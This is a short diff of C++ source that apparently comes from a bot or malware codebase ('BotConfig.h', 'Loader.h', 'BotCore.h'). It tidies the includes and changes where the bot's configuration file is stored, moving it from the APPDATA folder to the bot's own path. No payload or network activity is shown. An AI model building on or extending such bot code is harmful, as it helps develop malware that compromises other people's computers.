@@ -2,16 +2,11 @@
 #include <shlobj.h>
 
 #include "BotConfig.h"
-#include "GetApi.h"
-#include "Strings.h"
-#include "Memory.h"
-#include "Utils.h"
-#include "Config.h"
-#include "Crypt.h"
-#include "BotUtils.h"
+#include "BotCore.h"
 #include "Loader.h"
 #include "BotDef.h"
 #include "StrConsts.h"
+#include "BotUtils.h"
 
 #include "Modules.h"
 
@@ -551,18 +546,9 @@ string Config::GetFileName(bool HightPriority)
 
 	string FileName = (!HightPriority) ? GetStr(EStrConfigFileName) :
 										 GetStr(EStrConfigHPFileName);
-	return GetSpecialFolderPathA(CSIDL_APPDATA, FileName);
-
-//	pSHGetSpecialFolderPathA((HWND)NULL, FileName.t_str(), CSIDL_APPDATA, TRUE);
-//
-//	FileName.CalcLength();
-//
-//	if (!FileName.IsEmpty())
-//	{
-//		// Собираем полное имя
-//		FileName += (HightPriority)? BOT_CONFIG_NAME_HP : BOT_CONFIG_NAME;
-//    }
-//	return FileName;
+	string Result = BOT::GetBotPath();
+	Result += FileName;
+	return Result;
 }
 
 // ----------------------------------------------------------------------------
